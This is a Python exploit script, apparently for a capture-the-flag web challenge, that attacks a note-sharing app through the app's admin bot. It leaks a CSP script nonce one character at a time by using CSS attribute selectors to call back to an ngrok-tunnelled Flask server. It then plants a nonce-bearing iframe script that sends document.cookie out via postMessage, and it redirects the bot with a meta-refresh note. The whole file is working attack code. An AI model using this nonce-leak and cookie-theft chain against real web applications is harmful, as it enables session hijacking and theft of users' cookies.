import random
import string
from time import sleep
import httpx
from flask import Flask, request, render_template_string, send_file
from pyngrok import ngrok
from multiprocessing import Process

URL = "http://ctf.tcp1p.com:31079/"
INTERNAL_URL = "http://localhost"

PROXY: ngrok.NgrokTunnel = ngrok.connect("0.0.0.0:4444", "http")

print("public url:", PROXY.public_url)
with open("index.html", "r") as f:
    INDEX = f.read()

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)

class API(BaseAPI):
    def login(self, username, password):
        data = {"username": username, "password": password}
        return self.c.post("/login", data=data)

    def write_note(self, title, content):
        data = {"title": title, "content": content}
        return self.c.post("/write", data=data)

    def read_note_by_id(self, note_id):
        return self.c.get(f"/read/{note_id}")

    def share_diary(self, note_id):
        return self.c.get(f"/share_diary/{note_id}")

    def get_shared_notes(self):
        return self.c.get("/share")

    def read_shared_note_by_id(self, note_id, target_username):
        params = {"username": target_username}
        return self.c.get(f"/share/read/{note_id}", params=params)

    def logout(self):
        return self.c.get("/logout")

    def report(self, note_id, target_username):
        params = {"id": note_id, "username": target_username}
        return self.c.get("/report", params=params)

def oracle(chars):
    return 'script[nonce^="%s"]{background-image:url("%s")}' % (chars, PROXY.public_url+"/leak?nonce="+chars)

def valueleak(known):
    result = "<style>script { display: block }"
    for i in string.ascii_letters+string.digits:
        result += oracle(known+i)
    result += "</style>"
    return result

NONCE = ""
NOTE_COUNTER = 1
can_create = True

def server(api: API, creds):
    app = Flask(__name__)
    @app.get("/create_next_note")
    async def create_next_note():
        global NONCE, NOTE_COUNTER, can_create
        while (not can_create):
            sleep(1)
        print(f"leak-{NOTE_COUNTER}")
        api.write_note(f"leak-{NOTE_COUNTER}", valueleak(NONCE))
        api.share_diary(NOTE_COUNTER)
        NOTE_COUNTER+=1
        can_create = False
        return str(NOTE_COUNTER-1)
    @app.get("/create_xss")
    async def create_xss():
        global NONCE, NOTE_COUNTER, can_create
        while (not can_create):
            sleep(1)
        print(f"xss-{NOTE_COUNTER}")
        api.write_note(f"xss-{NOTE_COUNTER}", f"""<iframe srcdoc='<script nonce="{NONCE}">top.opener.postMessage(document.cookie, "*")</script>'>""")
        api.share_diary(NOTE_COUNTER)
        NOTE_COUNTER+=1
        can_create = False
        return str(NOTE_COUNTER-1)
    @app.get("/")
    async def home():
        return render_template_string(INDEX, **{
            "target": INTERNAL_URL,
            "username": creds
        })

    @app.get("/leak")
    async def leak():
        global NONCE, can_create
        NONCE = request.args.get("nonce")
        print(NONCE)
        can_create=True
        return ""
    app.run("0.0.0.0", 4444)


if __name__ == "__main__":
    api = API()
    creds = "sld"+random.randbytes(3).hex()
    print("credential", creds)
    api.login(creds, creds)
    proc = Process(target=server, args=(api,creds))
    proc.start()
    api.write_note("redirect", '<meta http-equiv="refresh" content="0; url='+PROXY.public_url+'">')
    api.share_diary(NOTE_COUNTER-1)
    api.report(NOTE_COUNTER-1, creds)
